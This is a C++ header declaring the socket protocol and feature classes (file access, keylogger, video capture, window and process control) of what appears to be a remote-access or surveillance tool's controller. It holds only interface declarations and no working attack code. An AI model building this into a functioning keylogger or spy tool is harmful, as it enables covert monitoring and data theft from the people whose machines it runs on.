#pragma once
#include <atomic>
#include <cstdint>
#include <winsock2.h>

struct PacketHeader {
    uint32_t packet_size;
    uint16_t request_id;
    uint8_t  request_type;
    uint8_t  request_key;
};

struct ResponseHeader {
    uint32_t packageSize;
    uint16_t responseID;
    uint16_t statusCode;
};

class Feature {
    struct RequestParam;
protected:
    SOCKET &sock;
    const int requestKey;
    void sendRequest(int type, int size, char *data);
    int receiveResponse(int &size, char **data);
    std::atomic_int returnValue = false;
public:
    Feature(SOCKET &socket, int key) : sock(socket), requestKey(key){}
    virtual ~Feature() = default;
    virtual DWORD requestingFeature(LPVOID lpParam) = 0;
    int getReturnedValue() const {
        return returnValue.load();
    }
    void forwardingFeature(RequestParam param);
};

class FileFeature: public Feature {
    struct RequestParam {
        int type;
        int size;
        char *path;
        int saveFileSize = 0;
        char *saveFilePath = nullptr;
    };
public:
    FileFeature(SOCKET &socket)
        : Feature(socket, 0x03) {
    }
    DWORD requestingFeature(LPVOID lpParam) override;
};

class KeyloggerFeature: public Feature {
    struct RequestParam {
        int type;
    };
    int size = -1;
    char *data;
public:
    KeyloggerFeature(SOCKET &socket)
        : Feature(socket, 0x01) {
    }
    int getSize() const {
        return size;
    }
    char *getData() const {
        if (returnValue != 0) {
            return nullptr;
        }
        return data;
    }

    DWORD requestingFeature(LPVOID lpParam) override;
};

class VideoFeature: public Feature {
    struct RequestParam {
        int type;
    };
    int size = -1;
    char *data;
public:
    VideoFeature(SOCKET &socket)
        : Feature(socket, 0x02) {
    }
    int getSize() const {
        return size;
    }
    char *getData() const {
        if (returnValue != 0) {
            return nullptr;
        }
        return data;
    }
    DWORD requestingFeature(LPVOID lpParam) override;
};

class WindowFeature: public Feature {
    struct RequestParam {
        int type;
    };
public:
    WindowFeature(SOCKET &socket)
        : Feature(socket, 0x04) {
    }
    DWORD requestingFeature(LPVOID lpParam) override;
};

class ProcessFeature: public Feature {
    struct RequestParam {
        int type;
        int size;
        char *data;
    };
public:
    ProcessFeature(SOCKET &socket)
        : Feature(socket, 0x00) {
    }
    DWORD requestingFeature(LPVOID lpParam) override;
};